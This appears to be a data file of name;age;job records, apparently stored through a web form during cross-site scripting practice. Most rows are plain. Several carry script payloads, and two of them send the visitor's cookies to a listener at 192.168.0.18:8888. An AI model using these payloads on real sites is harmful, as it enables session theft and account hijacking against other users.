John;25;carpenter
Peter;25;carpenter
Josh;25;carpenter
Christina;25;singer
Taylor;25;unemployed
<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie>;25;carpenter
Adam;25;carpenter
Prometheus;25;guard
Jenny;28;programmer
Jennifer;23;lawyer
John;15;carpenter
Britney;56;<script>alert(document.cookie)</script>
John;25;sailor
John;25;sailor
Fabrizio;6;student
John;25;carpenter
Leo;15;student
Leonardo;16;<script>alert('you are hacked')</script>
Popeye;25;sailor
John;27;carpenter
John;2;<script>alert(5)</script>
Eve;14;<script>var i=new Image i.src="http://192.168.0.18:8888/?"+document.cookie</script>;
Fabrizia;55;teacher
John;15;carpenter
Esther;50;shoemaker
Esther;23;human resource manager
Esther;23;carpenter
John;22;nanny
Myrthill;25;carpenter
